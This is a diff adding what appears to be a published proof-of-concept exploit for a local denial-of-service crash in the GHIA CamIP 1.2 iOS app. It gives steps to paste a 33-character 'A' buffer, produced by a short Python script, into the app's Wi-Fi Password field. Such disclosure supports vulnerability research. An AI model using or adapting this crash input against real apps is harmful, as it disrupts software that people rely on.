@@ -1,0 +1,30 @@
+# Exploit Title: GHIA CamIP 1.2 for iOS - 'Password' Denial of Service (PoC)
+# Discovery by: Ivan Marmolejo
+# Discovery Date: 2019-11-27
+# Vendor Homepage: https://apps.apple.com/mx/app/ghia-camip/id1342090963
+# Software Link: App Store for iOS devices
+# Tested Version: 1.2 
+# Vulnerability Type: Denial of Service (DoS) Local
+# Tested on OS: iPhone 6s iOS 13.2.3
+
+# Summary: With GHIA CamIP you can view your cameras in real time supports conventional IPC cameras, 
+# cameras with alarm, Video intercom and other devices. 
+
+
+# Steps to Produce the Crash:
+# 1.- Run python code: GHIA.py
+# 2.- Copy content to clipboard
+# 3.- Open "GHIA CamIP for iOS"
+# 4.- Go to "Add"
+# 5.- Wireless Settings
+# 6.- Connect to the internet
+# 7.- Paste Clipboard on "Password"
+# 8.- WiFi Connection
+# 9.- Start setting
+# 10- Crashed
+
+
+#!/usr/bin/env python
+
+buffer = "\x41" * 33
+print (buffer)
